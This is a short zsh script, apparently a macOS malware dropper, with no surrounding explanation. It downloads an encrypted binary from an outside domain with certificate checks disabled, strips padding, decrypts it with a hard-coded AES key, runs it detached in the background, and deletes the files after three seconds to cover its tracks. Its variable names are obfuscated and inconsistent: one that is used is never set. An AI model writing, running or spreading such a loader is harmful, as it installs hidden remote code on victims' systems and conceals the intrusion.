#!/bin/zsh
kubwz=$(mktemp /tmp/rrhdd3.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m38a9dd8f3b31ea57.bin" -o "$kubwzz" || exit 1
p28skk=$(stat -f %z "$kubwzz"); qex5mu3=$(( p28skk - 1319 - 1671 ))
tail -c +$(( 1319 + 1 )) "$kubwzz" | head -c $qex5mu3 | openssl enc -d -aes-256-cbc -k d953bc97f55f9a06ef94785d -out "$kubwz" 2>/dev/null
[ -s "$kubwz" ] && chmod 700 "$kubwz" && ( "$kubwz" & ) && disown
( sleep 3; rm -f "$kubwz" "$kubwzz" ) &>/dev/null &
